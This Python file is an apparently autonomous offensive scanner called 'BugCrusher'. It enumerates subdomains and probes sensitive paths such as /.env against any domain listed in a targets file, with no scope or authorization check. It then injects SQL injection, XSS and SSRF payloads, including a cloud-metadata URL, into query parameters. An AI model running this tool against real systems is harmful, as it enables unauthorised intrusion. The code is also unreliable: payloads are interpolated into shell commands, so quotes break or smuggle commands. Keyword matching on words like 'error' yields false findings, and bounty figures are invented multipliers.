#!/usr/bin/env python3
"""
BugCrusher — Hunt Execution Engine v3
Autonomous offensive security hunt execution.
No descriptions. No scripts. Actual results.
"""

import subprocess
import json
import sqlite3
import os
import time
import hashlib
from datetime import datetime
from pathlib import Path

TARGETS_FILE = "/home/workspace/BugCrusher/targets.md"
VECTOR_DB = "/home/workspace/BugCrusher/vector_db.sqlite"
REPORTS_DIR = "/home/workspace/BugCrusher/hunt_reports"
WORKSPACE = "/home/workspace/BugCrusher/workspace"

class BugCrusher:
    def __init__(self):
        self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:12]
        self.start_time = datetime.now()
        self.target = None
        self.recon_results = {"subdomains": [], "ips": [], "technologies": [], "endpoints": []}
        self.findings = []
        self.worm_status = "CLEAN"
        self.stats = {"recon_duration": 0, "scan_duration": 0, "vectors_tested": 0, "requests_sent": 0}
        
        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(WORKSPACE, exist_ok=True)
        
        print(f"[{self.session_id[:8]}] BugCrusher Hunt Engine initialized")
        print(f"[{self.session_id[:8]}] Workspace: {WORKSPACE}")
    
    def load_targets(self):
        if not os.path.exists(TARGETS_FILE):
            print(f"[!] No targets.md found")
            return []
        
        with open(TARGETS_FILE, 'r') as f:
            content = f.read()
        
        targets = []
        for line in content.split('\n'):
            line = line.strip()
            if line.startswith('- ') and ('.com' in line or '.io' in line or '.ai' in line or '.co' in line):
                target = line.replace('- ', '').replace('*', '').strip()
                targets.append(target)
        
        return targets
    
    def recon(self, target):
        print(f"\n[*] === RECON: {target} ===")
        t0 = time.time()
        self.recon_results = {"subdomains": [], "ips": [], "technologies": [], "endpoints": []}
        
        subs = self._enum_subdomains(target)
        self.recon_results["subdomains"] = subs
        
        if subs:
            ips = self._port_scan(subs[:50])
            self.recon_results["ips"] = ips
        
        if subs:
            tech = self._fingerprint(subs[:20])
            self.recon_results["technologies"] = tech
        
        if subs:
            endpoints = self._discover_endpoints(subs[:10])
            self.recon_results["endpoints"] = endpoints
        
        self.stats["recon_duration"] = round(time.time() - t0, 2)
        print(f"[*] Recon: {len(subs)} subs, {len(self.recon_results['ips'])} IPs, {len(self.recon_results["technologies"])} techs, {len(self.recon_results["endpoints"])} endpoints | {self.stats['recon_duration']}s")
        
        return self.recon_results
    
    def _enum_subdomains(self, target):
        subs = set()
        
        for word in ["www", "api", "admin", "test", "dev", "staging", "app", "mail", "cdn", "static", "m", "shop", "blog", "cdn2", "portal", "secure"]:
            host = f"{word}.{target}"
            try:
                r = subprocess.run(f"ping -c1 -W1 {host} 2>/dev/null", shell=True, capture_output=True, timeout=2)
                if r.returncode == 0:
                    subs.add(host)
            except:
                pass
        
        return list(subs)
    
    def _port_scan(self, hosts):
        ips = []
        for host in hosts[:30]:
            try:
                r = subprocess.run(f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 http://{host}", shell=True, capture_output=True, timeout=5)
                if r.stdout.decode().strip() in ['200', '301', '302', '403']:
                    ips.append(host)
            except:
                pass
        return ips
    
    def _fingerprint(self, hosts):
        techs = []
        for host in hosts[:20]:
            try:
                r = subprocess.run(f"whatweb -a 1 {host} 2>/dev/null | head -3", shell=True, capture_output=True, timeout=15)
                if r.stdout:
                    techs.append({"host": host, "tech": r.stdout.decode().strip()[:100]})
            except:
                pass
        return techs
    
    def _discover_endpoints(self, hosts):
        endpoints = []
        paths = ["/admin", "/api", "/login", "/admin.php", "/api/v1", "/graphql", "/debug", "/status", "/robots.txt", "/.env", "/config", "/dashboard", "/wp-admin", "/wp-login.php"]
        
        for host in hosts[:10]:
            for path in paths:
                url = f"http://{host}{path}"
                try:
                    r = subprocess.run(f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 {url}", shell=True, capture_output=True, timeout=8)
                    code = r.stdout.decode().strip()
                    if code in ['200', '301', '302', '403']:
                        endpoints.append({"url": url, "code": code})
                except:
                    pass
        
        return endpoints
    
    def scan(self, target):
        print(f"\n[*] === SCAN: {target} ===")
        t0 = time.time()
        
        self._nuclei_scan(target)
        self._payload_scan(target)
        self._basic_tests(target)
        
        self.stats["scan_duration"] = round(time.time() - t0, 2)
        print(f"[*] Scan: {len(self.findings)} findings | {self.stats['scan_duration']}s")
        
        return self.findings
    
    def _nuclei_scan(self, target):
        try:
            subs_file = f"{WORKSPACE}/subs_{self.session_id}.txt"
            with open(subs_file, 'w') as f:
                f.write('\n'.join(self.recon_results.get('subdomains', [])[:100]))
            
            cmd = f"nuclei -l {subs_file} -t cve/ -silent -no-color -o {WORKSPACE}/nuclei_{self.session_id}.txt -rate-limit 100 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True, timeout=300)
            
            if os.path.exists(f"{WORKSPACE}/nuclei_{self.session_id}.txt"):
                with open(f"{WORKSPACE}/nuclei_{self.session_id}.txt") as f:
                    for line in f:
                        if line.strip():
                            self.findings.append({
                                "type": "CVE", "severity": "HIGH", "target": target,
                                "description": line.strip()[:150], "payload": "N/A",
                                "cvss": 7.5, "source": "nuclei"
                            })
                os.remove(f"{WORKSPACE}/nuclei_{self.session_id}.txt")
            os.remove(subs_file)
        except Exception as e:
            print(f"[!] Nuclei failed: {e}")
    
    def _payload_scan(self, target):
        print("[*] Testing custom payloads...")
        
        conn = sqlite3.connect(VECTOR_DB)
        conn.row_factory = sqlite3.Row
        vectors = conn.execute("SELECT payload, category, fitness_score FROM vectors ORDER BY fitness_score DESC LIMIT 50").fetchall()
        conn.close()
        
        self.stats["vectors_tested"] = len(vectors)
        
        for v in vectors:
            for endpoint in self.recon_results.get("endpoints", [])[:10]:
                self._test_payload(endpoint["url"], v["payload"], v["category"])
    
    def _test_payload(self, url, payload, category):
        test_params = ["id", "q", "query", "search", "page", "name", "url", "next", "data", "callback", "q", "s"]
        
        for param in test_params:
            test_url = f"{url}?{param}={payload}"
            try:
                r = subprocess.run(f"curl -s --max-time 10 '{test_url}'", shell=True, capture_output=True, timeout=12)
                self.stats["requests_sent"] += 1
                response = r.stdout.decode().lower()
                
                if any(x in response for x in ["error", "mysql", "syntax", "exception", "alert(", "script>", "xss", "sql"]):
                    self.findings.append({
                        "type": category.upper(), "severity": self._cvss_to_severity(self._get_cvss(category)),
                        "target": url, "description": f"{category} via {param}",
                        "payload": payload, "cvss": self._get_cvss(category), "source": "vector"
                    })
                    return True
            except:
                pass
        
        return False
    
    def _basic_tests(self, target):
        tests = {
            "SQLI": ["1' OR '1'='1", "1' AND '1'='1", "1; SELECT * FROM users--"],
            "XSS": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
            "SSRF": ["http://localhost", "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"],
            "IDOR": ["/api/users/1", "/api/admin/users/1"],
        }
        
        for category, payloads in tests.items():
            for endpoint in self.recon_results.get("endpoints", [])[:5]:
                for payload in payloads[:2]:
                    self._test_payload(endpoint["url"], payload, category)
    
    def _cvss_to_severity(self, cvss):
        if cvss >= 9: return "CRITICAL"
        elif cvss >= 7: return "HIGH"
        elif cvss >= 4: return "MEDIUM"
        return "LOW"
    
    def _get_cvss(self, category):
        return {"SQLI": 9.1, "XSS": 6.1, "SSRF": 8.6, "IDOR": 7.1, "CMDI": 9.8, "SSTI": 9.0}.get(category.upper(), 5.0)
    
    def check_worms(self):
        print(f"\n[*] === WORM CHECK ===")
        suspicious = []
        
        for root, dirs, files in os.walk(WORKSPACE):
            for f in files:
                path = os.path.join(root, f)
                try:
                    with open(path, 'r', errors='ignore') as fh:
                        content = fh.read().lower()
                        for sig in ["self-replicat", "spawn child", "propagate", "chain tool_calls", "write worm"]:
                            if sig in content:
                                suspicious.append({"file": path, "sig": sig})
                except:
                    pass
        
        self.worm_status = "SUSPICIOUS" if suspicious else "CLEAN"
        print(f"[{'!' if suspicious else '+'}] Worm: {self.worm_status} ({len(suspicious)} artifacts)")
        
        return self.worm_status
    
    def generate_report(self, target):
        print(f"\n[*] === REPORT: {target} ===")
        
        p1 = [f for f in self.findings if f["severity"] == "CRITICAL"]
        p2 = [f for f in self.findings if f["severity"] == "HIGH"]
        p3 = [f for f in self.findings if f["severity"] in ["MEDIUM", "LOW"]]
        bounty = sum([f.get("cvss", 5) * 500 for f in p1]) + sum([f.get("cvss", 5) * 200 for f in p2])
        
        report = f"""# BugCrusher Hunt Report

**Session:** `{self.session_id}`  
**Target:** `{target}`  
**Date:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`  
**Duration:** `{(datetime.now() - self.start_time).total_seconds() / 3600:.2f}h`

---

## Recon

| | |
|--|--|
| Subdomains | {len(self.recon_results['subdomains'])} |
| Live Hosts | {len(self.recon_results['ips'])} |
| Technologies | {len(self.recon_results['technologies'])} |
| Endpoints | {len(self.recon_results['endpoints'])} |

### Discovered Subdomains
```
{chr(10).join(self.recon_results['subdomains'][:100])}
```

### Endpoints
| URL | Code |
|----|------|
"""
        for e in self.recon_results.get('endpoints', [])[:30]:
            report += f"| {e['url']} | {e['code']} |\n"
        
        report += f"""

---

## Findings ({len(self.findings)})

### P1 — Critical ({len(p1)})
| Type | Target | CVSS | Est. Bounty |
|------|--------|------|-------------|
"""
        for f in p1:
            report += f"| {f['type']} | {f['target'][:60]} | {f.get('cvss', '?')} | ${int(f.get('cvss', 5) * 500):,} |\n"
            report += f"| Payload | `{f['payload'][:80]}` | | |\n"
        
        report += f"\n### P2 — High ({len(p2)})\n\n"
        for f in p2:
            report += f"- **{f['type']}** at `{f['target'][:60]}` — CVSS {f.get('cvss', '?')}\n"
        
        report += f"\n### P3 — Medium/Low ({len(p3)})\n\n"
        for f in p3[:10]:
            report += f"- {f['type']} at `{f['target'][:60]}`\n"
        
        report += f"""

---

## Stats

| Metric | Value |
|--------|-------|
| Vectors Tested | {self.stats['vectors_tested']} |
| Requests | {self.stats['requests_sent']} |
| Worm Status | **{self.worm_status}** |
| **Est. Bounty** | **${bounty:,}** |

---

*Generated by BugCrusher v3.0 — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
"""
        
        report_path = f"{REPORTS_DIR}/{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(report_path, 'w') as f:
            f.write(report)
        
        print(f"[+] Report: {report_path}")
        
        # Save to hunt stats DB
        try:
            db_path = REPORTS_DIR.replace('hunt_reports', 'hunt_stats.db')
            conn = sqlite3.connect(db_path)
            conn.execute("""CREATE TABLE IF NOT EXISTS hunts (
                id INTEGER PRIMARY KEY, target TEXT, session_id TEXT, date TEXT,
                p1_count INTEGER, p2_count INTEGER, p3_count INTEGER,
                bounty_est REAL, worm_status TEXT
            )""")
            conn.execute("""INSERT INTO hunts VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (target, self.session_id, datetime.now().isoformat(), len(p1), len(p2), len(p3), bounty, self.worm_status))
            conn.commit()
            conn.close()
        except:
            pass
        
        return report_path
    
    def hunt(self, target):
        print(f"\n{'='*60}\nBUGCRUSHER HUNT: {target}\n{'='*60}")
        
        self.target = target
        self.start_time = datetime.now()
        self.recon(target)
        self.scan(target)
        self.check_worms()
        report = self.generate_report(target)
        self._triage()
        
        return {
            "target": target, "session": self.session_id,
            "findings": len(self.findings), "p1": len([f for f in self.findings if f["severity"] == "CRITICAL"]),
            "p2": len([f for f in self.findings if f["severity"] == "HIGH"]),
            "worm_status": self.worm_status, "report": report
        }
    
    def _triage(self):
        seen, unique = set(), []
        for f in self.findings:
            key = f"{f['type']}:{f['target']}:{f['payload']}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        self.findings = unique
        
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        self.findings.sort(key=lambda f: sev_order.get(f["severity"], 4))
        
        print(f"[*] Triage: {len(self.findings)} unique")


if __name__ == "__main__":
    import sys
    engine = BugCrusher()
    targets = [sys.argv[1]] if len(sys.argv) > 1 else engine.load_targets()
    
    if not targets:
        print("[!] No targets. Add to targets.md")
        sys.exit(1)
    
    for target in targets:
        result = engine.hunt(target)
        print(f"\n[+] {target} | Findings: {result['findings']} | P1: {result['p1']} | P2: {result['p2']} | Worm: {result['worm_status']}")
        print(f"    Report: {result['report']}")
